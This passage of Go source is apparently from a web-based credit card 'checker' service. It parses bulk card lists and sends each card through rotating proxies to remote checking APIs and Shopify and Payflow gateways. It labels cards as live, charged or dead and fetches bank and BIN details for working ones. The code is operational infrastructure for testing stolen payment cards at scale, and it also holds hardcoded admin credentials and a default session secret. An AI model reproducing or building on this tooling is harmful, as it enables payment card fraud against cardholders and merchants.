	getString := func(m map[string]interface{}, keys ...string) string {
		for _, k := range keys {
			if val, ok := m[k]; ok && val != nil {
				return fmt.Sprintf("%v", val)
			}
		}
		return ""
	}

	apiResponse := getString(raw, "Response", "response", "message")
	priceRaw := getString(raw, "Price", "price", "amount")
	currency := getString(raw, "Currency", "currency")
	checkTime := getString(raw, "Time", "time", "elapsed")
	gateway := getString(raw, "Gateway", "gateway", "Gate")
	if gateway == "" {
		gateway = "Shopify Payments"
	}
	receiptID := getString(raw, "receipt_id", "Receipt ID", "receipt_ID")
	if receiptID == "" {
		receiptID = "N/A"
	}

	status, emoji := classifyResponse(apiResponse)

	if status == "UNKNOWN" && apiResponse != "" {
		apiStatus := getString(raw, "Status", "status")
		if apiStatus == "false" || apiStatus == "False" {
			status = "ERROR"
			emoji = "⚠️"
		}
	}

	formattedPrice := "-"
	if priceRaw != "" && priceRaw != "-" {
		if f, err := strconv.ParseFloat(priceRaw, 64); err == nil {
			if currency != "" {
				formattedPrice = fmt.Sprintf("%.2f %s", f, currency)
			} else {
				formattedPrice = fmt.Sprintf("$%.2f", f)
			}
		} else {
			if currency != "" {
				formattedPrice = fmt.Sprintf("%s %s", priceRaw, currency)
			} else {
				formattedPrice = priceRaw
			}
		}
	}

	return CheckResult{
		Status:    status,
		Msg:       apiResponse,
		Emoji:     emoji,
		Price:     formattedPrice,
		Gateway:   gateway,
		Site:      site,
		ReceiptID: receiptID,
		Time:      checkTime,
	}
}

func doCheckPayflow(client *http.Client, card Card, proxyRaw string) CheckResult {
	cc := card.Formatted
	proxyConverted := formatProxyForAPI(proxyRaw)

	urlStr := fmt.Sprintf("https://payflow-v2-production-5485.up.railway.app/mlsn?cc=%s", url.QueryEscape(cc))
	if proxyConverted != "" {
		urlStr += fmt.Sprintf("&proxy=%s", url.QueryEscape(proxyConverted))
	}

	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return CheckResult{Status: "ERROR", Msg: err.Error(), Emoji: "⚠️", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
	}

	resp, err := client.Do(req)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return CheckResult{Status: "TIMEOUT", Msg: "Request Timeout (90s)", Emoji: "⏰", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
		}
		return CheckResult{Status: "EXCEPTION", Msg: err.Error(), Emoji: "🔥", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return CheckResult{Status: "ERROR", Msg: err.Error(), Emoji: "⚠️", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
	}

	var raw map[string]interface{}
	if err := json.Unmarshal(bodyBytes, &raw); err != nil {
		text := string(bodyBytes)
		text = regexp.MustCompile(`<[^>]+>`).ReplaceAllString(text, "")
		text = strings.TrimSpace(text)
		if len(text) > 200 {
			text = text[:200]
		}
		return CheckResult{Status: "ERROR", Msg: text, Emoji: "⚠️", Price: "-", Gateway: "Payflow V2", Site: "payflow", ReceiptID: "N/A"}
	}

	getString := func(m map[string]interface{}, keys ...string) string {
		for _, k := range keys {
			if val, ok := m[k]; ok && val != nil {
				return fmt.Sprintf("%v", val)
			}
		}
		return ""
	}

	apiResponse := getString(raw, "RESPMSG", "respmsg", "Response", "response", "message", "Message")
	cvv2 := getString(raw, "CVV2MATCH", "cvv2match", "CVV2", "cvv2")
	procCvv2 := getString(raw, "PROCCVV2", "proccvv2")
	orderID := getString(raw, "orderid", "ORDERID", "invoiceNumber")
	checkTime := getString(raw, "Time", "time", "elapsed")
	gatewayVal := getString(raw, "Gateway", "gateway", "Gate")
	if gatewayVal == "" {
		gatewayVal = "Payflow V2"
	}

	if strings.Contains(apiResponse, "10069") {
		payflowLockMu.Lock()
		payflowLockedUntil = time.Now().Add(30 * time.Minute)
		payflowLockMu.Unlock()
	}

	var status string
	var emoji string

	if procCvv2 == "M" && cvv2 == "Y" {
		status = "LIVE"
		emoji = "✅"
	} else if strings.Contains(strings.ToLower(apiResponse), "approved") {
		status = "CHARGED"
		emoji = "🔥"
	} else {
		isDead := false
		lowerResp := strings.ToLower(apiResponse)
		for _, k := range deadKeywords {
			if strings.Contains(lowerResp, k) {
				isDead = true
				break
			}
		}
		if isDead {
			status = "DEAD"
			emoji = "❌"
		} else {
			status = "ERROR"
			emoji = "⚠️"
		}
	}

	finalMsg := fmt.Sprintf("%s | CVV2MATCH: %s | PROCCVV2: %s | ORDERID: %s", apiResponse, cvv2, procCvv2, orderID)

	return CheckResult{
		Status:    status,
		Msg:       finalMsg,
		Emoji:     emoji,
		Price:     "-",
		Gateway:   gatewayVal,
		Site:      "payflow",
		ReceiptID: "N/A",
		Time:      checkTime,
	}
}

func checkCard(client *http.Client, sacAPI string, card Card, sites []string, proxies []string, gateway string) CheckResult {
	var lastResult CheckResult
	for attempt := 0; attempt < 5; attempt++ {
		site := pickRandomSite(sites)
		proxy := GetProxyManager().PickProxy(proxies)
		
		start := time.Now()
		var result CheckResult
		if gateway == "payflow" {
			result = doCheckPayflow(client, card, proxy)
		} else {
			result = doCheck(client, sacAPI, card, site, proxy)
		}
		latency := time.Since(start)
		lastResult = result

		isSuccess := true
		if result.Status == "TIMEOUT" || result.Status == "EXCEPTION" {
			isSuccess = false
		} else if result.Status == "ERROR" {
			if !isExpiryError(result.Msg) {
				isSuccess = false
			}
		}

		if proxy != "" {
			GetProxyManager().RecordResult(proxy, latency, isSuccess)
		}

		if noRetryStatuses[result.Status] {
			return result
		}
		if result.Status == "ERROR" && isExpiryError(result.Msg) {
			return result
		}
		if result.Status != "ERROR" && result.Status != "TIMEOUT" && result.Status != "EXCEPTION" && result.Status != "UNKNOWN" {
			return result
		}
	}
	return lastResult
}

func checkCardsBatch(client *http.Client, sacAPI string, cards []Card, sites []string, proxies []string, concurrency int, gateway string) []CheckResult {
	if concurrency <= 0 {
		concurrency = 1000
	}
	sem := make(chan struct{}, concurrency)
	results := make([]CheckResult, len(cards))

	var wg sync.WaitGroup
	for i, card := range cards {
		wg.Add(1)
		go func(index int, c Card) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			res := checkCard(client, sacAPI, c, sites, proxies, gateway)
			res.Card = c.Formatted

			if res.Status == "CHARGED" || res.Status == "LIVE" || res.Status == "OTP_REQUIRED" || res.Status == "LOW_BALANCE" {
				binNum := getBinNumber(c.Formatted)
				if binNum != "" {
					if binInfo, err := fetchBinInfo(binNum); err == nil && binInfo != nil {
						res.BinBrand = binInfo.Brand
						res.BinType = binInfo.Type
						res.BinClass = binInfo.Class
						res.BinBank = binInfo.Bank
						res.BinCountry = binInfo.Country
					}
				}
			}

			results[index] = res
		}(i, card)
	}
	wg.Wait()
	return results
}

func signSession(payload string, secret []byte) string {
	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte(payload))
	signature := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return base64.RawURLEncoding.EncodeToString([]byte(payload)) + "." + signature
}

func verifySession(token string, secret []byte) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 2 {
		return "", errors.New("invalid token")
	}
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", err
	}
	mac := hmac.New(sha256.New, secret)
	mac.Write(payloadBytes)
	expectedSignature := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	if parts[1] != expectedSignature {
		return "", errors.New("invalid signature")
	}
	return string(payloadBytes), nil
}

func setSession(w http.ResponseWriter, sessionData map[string]interface{}) {
	payloadBytes, _ := json.Marshal(sessionData)
	secretKey := os.Getenv("SECRET_KEY")
	if secretKey == "" {
		secretKey = "mlsn-web-checker-secret"
	}
	token := signSession(string(payloadBytes), []byte(secretKey))
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    token,
		Path:     "/",
		HttpOnly: true,
	})
}

func getSession(r *http.Request) map[string]interface{} {
	cookie, err := r.Cookie("session")
	if err != nil {
		return nil
	}
	secretKey := os.Getenv("SECRET_KEY")
	if secretKey == "" {
		secretKey = "mlsn-web-checker-secret"
	}
	payload, err := verifySession(cookie.Value, []byte(secretKey))
	if err != nil {
		return nil
	}
	var sessionData map[string]interface{}
	json.Unmarshal([]byte(payload), &sessionData)
	return sessionData
}

func requireLogin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		allowedRoutes := []string{
			"/login",
			"/api/login/telegram",
			"/api/login/admin",
			"/api/login/mock",
		}

		path := r.URL.Path
		if strings.HasPrefix(path, "/static/") || strings.HasPrefix(path, "/assets/") {
			next(w, r)
			return
		}

		isAllowed := false
		for _, route := range allowedRoutes {
			if path == route {
				isAllowed = true
				break
			}
		}
		if isAllowed {
			next(w, r)
			return
		}

		sessionData := getSession(r)
		var user interface{}
		var admin interface{}
		if sessionData != nil {
			user = sessionData["user"]
			admin = sessionData["admin"]
		}

		isLoggedIn := user != nil && user != "" || admin == true

		if !isLoggedIn {
			http.Redirect(w, r, "/login?next="+url.QueryEscape(path), http.StatusFound)
			return
		}

		if strings.HasPrefix(path, "/vanlinh") && admin != true {
			http.Redirect(w, r, "/login?admin=1&next="+url.QueryEscape(path), http.StatusFound)
			return
		}

		next(w, r)
	}
}

func requireAdmin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessionData := getSession(r)
		var admin interface{}
		if sessionData != nil {
			admin = sessionData["admin"]
		}

		if admin != true {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusForbidden)
			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Forbidden: Admin access required"})
			return
		}
		next(w, r)
	}
}

func verifyTelegramAuth(authData map[string]string, botToken string) bool {
	checkHash := authData["hash"]
	if checkHash == "" || botToken == "" {
		return false
	}

	authDateStr := authData["auth_date"]
	authDate, err := strconv.ParseInt(authDateStr, 10, 64)
	if err != nil || time.Now().Unix()-authDate > 86400 {
		return false
	}

	var keys []string
	for k := range authData {
		if k != "hash" {
			keys = append(keys, k)
		}
	}
	sort.Strings(keys)

	var dataList []string
	for _, k := range keys {
		dataList = append(dataList, fmt.Sprintf("%s=%s", k, authData[k]))
	}
	dataCheckString := strings.Join(dataList, "\n")

	h := sha256.New()
	h.Write([]byte(botToken))
	secretKey := h.Sum(nil)

	mac := hmac.New(sha256.New, secretKey)
	mac.Write([]byte(dataCheckString))
	computedHash := hex.EncodeToString(mac.Sum(nil))

	return computedHash == checkHash
}

type PendingLogin struct {
	ID        int64
	Username  string
	FirstName string
	Expiry    time.Time
}

func isTelegramUserAllowed(userID int64) bool {
	if db == nil {
		if os.Getenv("TELEGRAM_BOT_TOKEN") == "" {
			return true
		}
		return false
	}
	
	var exists bool
	err := db.QueryRow("SELECT EXISTS(SELECT 1 FROM allowed_users WHERE user_id = $1)", userID).Scan(&exists)
	if err == nil && exists {
		return true
	}
	
	err = db.QueryRow("SELECT EXISTS(SELECT 1 FROM users WHERE user_id = $1)", userID).Scan(&exists)
	if err == nil && exists {
		return true
	}
	
	return false
}

func apiLoginTokenHandler(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token == "" {
		http.Error(w, "Token is required", http.StatusBadRequest)
		return
	}

	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	var pending PendingLogin
	err := db.QueryRow("SELECT user_id, username, first_name, expiry FROM web_login_tokens WHERE token = $1", token).Scan(&pending.ID, &pending.Username, &pending.FirstName, &pending.Expiry)
	
	if err != nil {
		if err == sql.ErrNoRows {
			http.Error(w, "Invalid or expired login link", http.StatusUnauthorized)
		} else {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
		return
	}

	// Update token expiry to 15 seconds from now if it is not already set to a short duration.
	// This provides a grace period to handle Telegram's link preview crawlers making double requests.
	graceExpiry := time.Now().Add(15 * time.Second)
	if pending.Expiry.Sub(time.Now()) > 20*time.Second {
		_, _ = db.Exec("UPDATE web_login_tokens SET expiry = $1 WHERE token = $2", graceExpiry, token)
	}

	if time.Now().After(pending.Expiry) {
		_, _ = db.Exec("DELETE FROM web_login_tokens WHERE token = $1", token)
		http.Error(w, "Login link has expired", http.StatusUnauthorized)
		return
	}

	user := pending.Username
	if user == "" {
		user = pending.FirstName
	}
	if user == "" {
		user = fmt.Sprintf("tg_%d", pending.ID)
	}

	uLower := strings.ToLower(user)
	isAdminUser := uLower == "vanlinhcute" || uLower == "hthcte" || uLower == "@hthcte"

	// Enforce database-based access control for non-admins
	if !isAdminUser && !isTelegramUserAllowed(pending.ID) {
		http.Error(w, "Access Denied: You are not authorized to use this checker. Please register/add via the Telegram bot.", http.StatusForbidden)
		return
	}

	sessionData := map[string]interface{}{
		"user":    user,
		"user_id": pending.ID,
	}
	
	if isAdminUser {
		sessionData["admin"] = true
	}

	setSession(w, sessionData)
	http.Redirect(w, r, "/", http.StatusFound)
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "frontend/dist/index.html")
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "frontend/dist/index.html")
}

func vanlinhHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "frontend/dist/index.html")
}

func apiLoginAdminHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var reqData struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	username := strings.TrimSpace(reqData.Username)
	password := strings.TrimSpace(reqData.Password)

	if username == "vanlinhcute" && password == "gaidepknoinhieu" {
		sessionData := map[string]interface{}{
			"user":  "vanlinhcute",
			"admin": true,
		}
		setSession(w, sessionData)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":  true,
			"redirect": "/vanlinh",
		})
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusUnauthorized)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"error": "Incorrect credentials",
	})
}

func apiLoginTelegramHandler(w http.ResponseWriter, r *http.Request) {
	queryParams := r.URL.Query()
	authData := make(map[string]string)
	for k, v := range queryParams {
		if len(v) > 0 {
			authData[k] = v[0]
		}
	}

	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	if botToken != "" {
		if verifyTelegramAuth(authData, botToken) {
			user := authData["username"]
			if user == "" {
				user = authData["first_name"]
			}
			if user == "" {
				user = authData["id"]
			}
			var uID int64
			if idStr, exists := authData["id"]; exists {
				uID, _ = strconv.ParseInt(idStr, 10, 64)
			}
			sessionData := map[string]interface{}{
				"user":    user,
				"user_id": uID,
			}
			setSession(w, sessionData)
			http.Redirect(w, r, "/", http.StatusFound)
			return
		} else {
			http.Error(w, "Telegram authentication failed.", http.StatusUnauthorized)
			return
		}
	} else {
		user := authData["username"]
		if user == "" {
			user = authData["first_name"]
		}
		if user == "" {
			user = "test_user"
		}
		var uID int64
		if idStr, exists := authData["id"]; exists {
			uID, _ = strconv.ParseInt(idStr, 10, 64)
		}
		sessionData := map[string]interface{}{
			"user":    user,
			"user_id": uID,
		}
		setSession(w, sessionData)
		http.Redirect(w, r, "/", http.StatusFound)
		return
	}
}

func apiLoginMockHandler(w http.ResponseWriter, r *http.Request) {
	if os.Getenv("TELEGRAM_BOT_TOKEN") != "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error": "Mock login is disabled in production",
		})
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var reqData struct {
		Username string `json:"username"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	username := strings.TrimSpace(reqData.Username)
	if username == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error": "Username is empty",
		})
		return
	}
	sessionData := map[string]interface{}{
		"user": username,
	}
	setSession(w, sessionData)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success":  true,
		"redirect": "/",
	})
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    "",
		Path:     "/",
		HttpOnly: true,
		MaxAge:   -1,
	})
	http.Redirect(w, r, "/login", http.StatusFound)
}

func apiStatsHandler(w http.ResponseWriter, r *http.Request) {
	userID, username, isAdmin := getSessionUser(r)
	isLoggedIn := userID != 0 || username != "" || isAdmin

	sc := 0
	pc := 0

	if isLoggedIn {
		userSites := loadFile(SITES_FILE)
		userProxies := loadFile(PROXIES_FILE)

		if len(userSites) > 0 {
			sc = len(userSites)
		} else {
			sc = len(getSitesFromDB(userID, isAdmin))
		}

		if len(userProxies) > 0 {
			pc = len(userProxies)
		} else {
			pc = len(getProxiesFromDB(userID, isAdmin))
		}
	}

	sacAPI := os.Getenv("SAC_API")
	if sacAPI == "" {
		sacAPI = "https://thorough-fascination-production-725d.up.railway.app"
	}

	botUsername := os.Getenv("TELEGRAM_BOT_USERNAME")

	sessionUser := username

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"sites_count":   sc,
		"proxies_count": pc,
		"api_url":       sacAPI,
		"bot_username":  botUsername,
		"authenticated": isLoggedIn,
		"user":          sessionUser,
	})
}

func apiCheckBatchHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		Cards       []Card      `json:"cards"`
		Proxies     []string    `json:"proxies"`
		Concurrency interface{} `json:"concurrency"`
		Semaphore   interface{} `json:"semaphore"`
		Gateway     string      `json:"gateway"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	concurrency := 1000
	getConcurrency := func(val interface{}) int {
		if val == nil {
			return 0
		}
		switch v := val.(type) {
		case float64:
			return int(v)
		case string:
			if i, err := strconv.Atoi(v); err == nil {
				return i
			}
		}
		return 0
	}
	if c := getConcurrency(reqData.Concurrency); c > 0 {
		concurrency = c
	} else if s := getConcurrency(reqData.Semaphore); s > 0 {
		concurrency = s
	}

	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	proxies := reqData.Proxies
	if len(proxies) == 0 {
		proxies = getProxies(userID, isAdmin)
	}

	if reqData.Gateway == "payflow" {
		if len(reqData.Cards) > 1 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 chỉ hỗ trợ check đơn, không hỗ trợ check hàng loạt!"})
			return
		}
		if len(proxies) == 0 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 bắt buộc phải có proxy mới được check!"})
			return
		}
	}

	client := &http.Client{
		Timeout: 90 * time.Second,
	}
	sacAPI := os.Getenv("SAC_API")
	if sacAPI == "" {
		sacAPI = "https://thorough-fascination-production-725d.up.railway.app"
	}

	results := checkCardsBatch(client, sacAPI, reqData.Cards, sites, proxies, concurrency, reqData.Gateway)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"results": results})
}

func handleCheckSSE(w http.ResponseWriter, r *http.Request, cards []Card, sites []string, proxies []string, concurrency int, gateway string) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
		return
	}

	client := &http.Client{
		Timeout: 90 * time.Second,
	}
	sacAPI := os.Getenv("SAC_API")
	if sacAPI == "" {
		sacAPI = "https://thorough-fascination-production-725d.up.railway.app"
	}

	var allResults []CheckResult
	batchSize := 200
	totalCards := len(cards)

	for i := 0; i < totalCards; i += batchSize {
		end := i + batchSize
		if end > totalCards {
			end = totalCards
		}
		batch := cards[i:end]
		batchResults := checkCardsBatch(client, sacAPI, batch, sites, proxies, concurrency, gateway)
		allResults = append(allResults, batchResults...)

		stats := map[string]int{
			"total":       len(allResults),
			"done":        len(allResults),
			"charged":     0,
			"live":        0,
			"fraud":       0,
			"dead":        0,
			"error":       0,
			"low_balance": 0,
			"otp":         0,
		}
		for _, res := range allResults {
			switch res.Status {
			case "CHARGED":
				stats["charged"]++
			case "LIVE":
				stats["live"]++
			case "FRAUD":
				stats["fraud"]++
			case "DEAD":
				stats["dead"]++
			case "LOW_BALANCE":
				stats["low_balance"]++
			case "OTP_REQUIRED":
				stats["otp"]++
			case "ERROR", "TIMEOUT", "EXCEPTION":
				stats["error"]++
			}
		}

		eventData, _ := json.Marshal(map[string]interface{}{
			"type":        "batch",
			"results":     batchResults,
			"stats":       stats,
			"total_cards": totalCards,
		})
		fmt.Fprintf(w, "data: %s\n\n", string(eventData))
		flusher.Flush()
	}

	stats := map[string]int{
		"total":       len(allResults),
		"done":        len(allResults),
		"charged":     0,
		"live":        0,
		"fraud":       0,
		"dead":        0,
		"error":       0,
		"low_balance": 0,
		"otp":         0,
	}
	for _, res := range allResults {
		switch res.Status {
		case "CHARGED":
			stats["charged"]++
		case "LIVE":
			stats["live"]++
		case "FRAUD":
			stats["fraud"]++
		case "DEAD":
			stats["dead"]++
		case "LOW_BALANCE":
			stats["low_balance"]++
		case "OTP_REQUIRED":
			stats["otp"]++
		case "ERROR", "TIMEOUT", "EXCEPTION":
			stats["error"]++
		}
	}

	eventData, _ := json.Marshal(map[string]interface{}{
		"type":        "done",
		"stats":       stats,
		"total_cards": totalCards,
	})
	fmt.Fprintf(w, "data: %s\n\n", string(eventData))
	flusher.Flush()
}

func apiCheckHandler(w http.ResponseWriter, r *http.Request) {
	var reqData struct {
		Cards       string      `json:"cards"`
		Proxies     []string    `json:"proxies"`
		Concurrency interface{} `json:"concurrency"`
		Semaphore   interface{} `json:"semaphore"`
		Gateway     string      `json:"gateway"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reqData); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	cards := parseCards(reqData.Cards)
	if len(cards) == 0 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No valid cards found"})
		return
	}

	concurrency := 1000
	getConcurrency := func(val interface{}) int {
		if val == nil {
			return 0
		}
		switch v := val.(type) {
		case float64:
			return int(v)
		case string:
			if i, err := strconv.Atoi(v); err == nil {
				return i
			}
		}
		return 0
	}
	if c := getConcurrency(reqData.Concurrency); c > 0 {
		concurrency = c
	} else if s := getConcurrency(reqData.Semaphore); s > 0 {
		concurrency = s
	}

	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	proxies := reqData.Proxies
	if len(proxies) == 0 {
		proxies = getProxies(userID, isAdmin)
	}

	if reqData.Gateway == "payflow" {
		payflowLockMu.RLock()
		locked := time.Now().Before(payflowLockedUntil)
		remaining := time.Until(payflowLockedUntil)
		payflowLockMu.RUnlock()
		if locked {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusForbidden)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"error": fmt.Sprintf("Payflow V2 is temporarily locked for another %d minutes due to account issues (Error 10069).", int(remaining.Minutes())+1),
			})
			return
		}

		if !isAdmin {
			payflowCooldownMu.Lock()
			lastCheck, exists := payflowUserCooldown[userID]
			if exists && time.Since(lastCheck) < 10*time.Second {
				rem := 10*time.Second - time.Since(lastCheck)
				payflowCooldownMu.Unlock()
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusTooManyRequests)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"error": fmt.Sprintf("Rate limit: Please wait %.1f seconds before checking again.", rem.Seconds()),
				})
				return
			}
			payflowUserCooldown[userID] = time.Now()
			payflowCooldownMu.Unlock()
		}

		if len(cards) > 1 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 chỉ hỗ trợ check đơn, không hỗ trợ check hàng loạt!"})
			return
		}
		if len(proxies) == 0 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 bắt buộc phải có proxy mới được check!"})
			return
		}
	}

	if !isAdmin && len(cards) > 20000 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Giới hạn tối đa 20.000 thẻ cho mỗi task! / Maximum limit of 20,000 cards per task!"})
		return
	}

	if db != nil {
		var hasRunning bool
		errRunning := db.QueryRow(`
			SELECT EXISTS(
				SELECT 1 FROM check_tasks 
				WHERE user_id = $1 AND status = 'running'
			)
		`, userID).Scan(&hasRunning)
		if errRunning == nil && hasRunning {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusConflict)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"error": "Bạn đang có một task khác đang chạy! Vui lòng đợi task đó hoàn thành hoặc hủy nó trước. / You already have a task running! Please wait or cancel it first.",
			})
			return
		}
	}

	handleCheckSSE(w, r, cards, sites, proxies, concurrency, reqData.Gateway)
}

func apiCheckUploadHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	
	gateway := r.FormValue("gateway")
	if gateway == "payflow" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Gateway Payflow V2 chỉ hỗ trợ check đơn và không cho phép upload file / check hàng loạt!"})
		return
	}

	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

	contentBytes, err := io.ReadAll(file)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": err.Error()})
		return
	}

	cards := parseCards(string(contentBytes))
	if len(cards) == 0 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No valid cards found in file"})
		return
	}

	proxiesRaw := r.FormValue("proxies")
	var proxies []string
	if proxiesRaw != "" {
		if err := json.Unmarshal([]byte(proxiesRaw), &proxies); err != nil {
			lines := strings.Split(proxiesRaw, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" {
					proxies = append(proxies, line)
				}
			}
		}
	}

	concurrencyVal := r.FormValue("concurrency")
	if concurrencyVal == "" {
		concurrencyVal = r.FormValue("semaphore")
	}
	concurrency := 1000
	if concurrencyVal != "" {
		if i, err := strconv.Atoi(concurrencyVal); err == nil {
			concurrency = i
		}
	}

	userID, _, isAdmin := getSessionUser(r)
	sites := getSites(userID, isAdmin)
	if len(proxies) == 0 {
		proxies = getProxies(userID, isAdmin)
	}

	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	if !isAdmin && len(cards) > 20000 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Giới hạn tối đa 20.000 thẻ cho mỗi task! / Maximum limit of 20,000 cards per task!"})
		return
	}

	var hasRunning bool
	errRunning := db.QueryRow(`
		SELECT EXISTS(
			SELECT 1 FROM check_tasks 
			WHERE user_id = $1 AND status = 'running'
		)
	`, userID).Scan(&hasRunning)
	if errRunning == nil && hasRunning {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusConflict)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error": "Bạn đang có một task khác đang chạy! Vui lòng đợi task đó hoàn thành hoặc hủy nó trước khi tạo task mới. / You have another task running! Please wait for it to complete or cancel it first.",
		})
		return
	}

	var taskID int
	err = db.QueryRow(`
		INSERT INTO check_tasks (user_id, status, total_cards, checked_cards, results)
		VALUES ($1, 'running', $2, 0, '[]'::jsonb)
		RETURNING id
	`, userID, len(cards)).Scan(&taskID)
	if err != nil {
		log.Println("Failed to create task in DB:", err)
		http.Error(w, "Failed to create task", http.StatusInternalServerError)
		return
	}
	if userID == 6071715158 {
		isAdmin = true
	}
	go runTask(taskID, userID, cards, sites, proxies, concurrency, isAdmin, gateway)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"task_id": taskID,
	})
}

func apiUploadSitesHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(200 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "No file uploaded"})
		return
	}
	defer file.Close()

